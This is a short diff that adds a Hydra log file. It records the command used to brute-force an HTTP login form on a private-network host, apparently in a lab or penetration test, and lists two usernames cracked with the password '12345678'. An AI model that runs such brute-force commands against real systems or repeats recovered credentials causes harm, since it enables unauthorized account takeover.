@@ -1,0 +1,3 @@
+# Hydra v9.2 run at 2024-05-12 23:18:58 on 192.168.100.164 http-post-form (hydra -L userlist.txt -P passlist.txt -v -o accweblist.txt 192.168.100.164 http-post-form /login:username=^USER^&password=^PASS^:F=/login)
+[80][http-post-form] host: 192.168.100.164   login: vinhquang   password: 12345678
+[80][http-post-form] host: 192.168.100.164   login: minhnghia   password: 12345678
